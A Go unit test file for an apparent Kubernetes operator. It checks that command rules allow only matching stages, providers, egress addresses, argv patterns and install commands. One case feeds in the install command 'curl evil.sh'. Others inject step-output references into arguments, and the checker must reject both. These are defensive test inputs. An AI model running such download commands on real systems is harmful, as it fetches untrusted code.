//nolint:goconst // table-driven test data repeats argv words
package rules_test

import (
	"reflect"
	"testing"

	lastv1alpha1 "github.com/moogie-labs/last-operator/api/v1alpha1"
	"github.com/moogie-labs/last-operator/internal/rules"
)

func baseRule() lastv1alpha1.CommandRuleSpec {
	return lastv1alpha1.CommandRuleSpec{
		Stages:    []lastv1alpha1.Stage{lastv1alpha1.StageCreate},
		Providers: []string{"aws", "github"},
		Match:     lastv1alpha1.ArgvPattern{Argv: []string{"aws", "s3", "cp", "*", "*"}},
		Install:   []lastv1alpha1.ArgvPattern{{Argv: []string{"pip", "install", "boto3"}}},
		Egress:    []string{"10.0.0.0/8:443", "example.com:443"},
	}
}

func baseCmd() lastv1alpha1.Command {
	return lastv1alpha1.Command{
		ID:        "s1",
		Run:       lastv1alpha1.CommandRun{Argv: []string{"aws", "s3", "cp", "a", "b"}},
		Providers: []string{"aws"},
		Egress:    []string{"10.1.2.3:443"},
		Image: &lastv1alpha1.ImageSpec{Install: []lastv1alpha1.ArgvCommand{
			{Argv: []string{"pip", "install", "boto3"}},
		}},
	}
}

func TestCoversChecksEveryCondition(t *testing.T) {
	create := lastv1alpha1.StageCreate
	tests := []struct {
		name   string
		stage  lastv1alpha1.Stage
		mutate func(*lastv1alpha1.CommandRuleSpec, *lastv1alpha1.Command)
		want   bool
	}{
		{"everything satisfied", create, func(*lastv1alpha1.CommandRuleSpec, *lastv1alpha1.Command) {}, true},
		{"stage not in rule", lastv1alpha1.StageDelete, func(*lastv1alpha1.CommandRuleSpec, *lastv1alpha1.Command) {}, false},
		{"provider not in rule", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Providers = []string{"aws", "gcp"}
		}, false},
		{"no providers is fine", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) { c.Providers = nil }, true},
		{"egress not covered", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Egress = []string{"10.1.2.3:443", "192.168.0.1:443"}
		}, false},
		{"egress port differs", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Egress = []string{"10.1.2.3:80"}
		}, false},
		{"command host egress is never covered", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Egress = []string{"example.com:443"}
		}, false},
		{"malformed command egress", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Egress = []string{"nonsense"}
		}, false},
		{"rule egress that fails to parse covers nothing", create, func(r *lastv1alpha1.CommandRuleSpec, _ *lastv1alpha1.Command) {
			r.Egress = []string{"10.0.0.0/8:443", "nonsense"}
		}, false},
		{"rule egress that fails to parse, command without egress", create, func(r *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			r.Egress = []string{"nonsense"}
			c.Egress = nil
		}, true},
		{"no egress is fine", create, func(r *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			r.Egress = nil
			c.Egress = nil
		}, true},
		{"command egress with rule without egress", create, func(r *lastv1alpha1.CommandRuleSpec, _ *lastv1alpha1.Command) {
			r.Egress = nil
		}, false},
		{"argv does not match", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run.Argv = []string{"aws", "s3", "rm", "a", "b"}
		}, false},
		{"argv longer than a glob pattern", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run.Argv = []string{"aws", "s3", "cp", "a", "b", "--recursive"}
		}, false},
		{"install command unmatched", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Image.Install = append(c.Image.Install, lastv1alpha1.ArgvCommand{Argv: []string{"curl", "evil.sh"}})
		}, false},
		{"install with a rule that has none", create, func(r *lastv1alpha1.CommandRuleSpec, _ *lastv1alpha1.Command) {
			r.Install = nil
		}, false},
		{"no image needs no install patterns", create, func(r *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			r.Install = nil
			c.Image = nil
		}, true},
		{"empty install list needs nothing", create, func(r *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			r.Install = nil
			c.Image = &lastv1alpha1.ImageSpec{}
		}, true},
		{"script", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run = lastv1alpha1.CommandRun{Script: "aws s3 cp a b"}
		}, false},
		{"script and argv", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run.Script = "x"
		}, false},
		{"no argv", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run = lastv1alpha1.CommandRun{}
		}, false},
		{"step reference in argv", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run.Argv = []string{"aws", "s3", "cp", "a", "${steps.s0.stdout}"}
		}, false},
		{"step reference embedded in an argument", create, func(_ *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			c.Run.Argv = []string{"aws", "s3", "cp", "a", "s3://${steps.s0.stdout}/x"}
		}, false},
		{"step reference in install argv", create, func(r *lastv1alpha1.CommandRuleSpec, c *lastv1alpha1.Command) {
			r.Install = []lastv1alpha1.ArgvPattern{{Argv: []string{"pip", "install", "*"}}}
			c.Image.Install = []lastv1alpha1.ArgvCommand{{Argv: []string{"pip", "install", "${steps.s0.stdout}"}}}
		}, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r, c := baseRule(), baseCmd()
			tt.mutate(&r, &c)
			if got := rules.Covers(r, tt.stage, c); got != tt.want {
				t.Errorf("Covers = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCoverageReportsUncoveredInPlanOrder(t *testing.T) {
	cluster := rules.Rule{Ref: rules.Ref{Scope: "cluster", Name: "a-cluster"}, Spec: baseRule()}
	ns := rules.Rule{Ref: rules.Ref{Scope: "namespace", Namespace: "team-x", Name: "b-ns"}, Spec: baseRule()}
	mk := func(id string, argv ...string) lastv1alpha1.Command {
		return lastv1alpha1.Command{ID: id, Run: lastv1alpha1.CommandRun{Argv: argv}}
	}
	steps := []lastv1alpha1.Command{
		mk("z", "aws", "s3", "rm", "x", "y"),
		mk("a", "aws", "s3", "cp", "x", "y"),
		mk("m", "terraform", "apply"),
	}
	covered, uncovered := rules.Coverage([]rules.Rule{cluster, ns}, lastv1alpha1.StageCreate, steps)
	if want := []string{"z", "m"}; !reflect.DeepEqual(uncovered, want) {
		t.Errorf("uncovered = %v, want %v (plan order)", uncovered, want)
	}
	if len(covered) != 1 || covered["a"] != cluster.Ref {
		t.Errorf("covered = %v, want a -> first rule in input order", covered)
	}
	covered, uncovered = rules.Coverage(nil, lastv1alpha1.StageCreate, steps)
	if len(covered) != 0 || len(uncovered) != 3 {
		t.Errorf("no rules: covered = %v, uncovered = %v", covered, uncovered)
	}
}
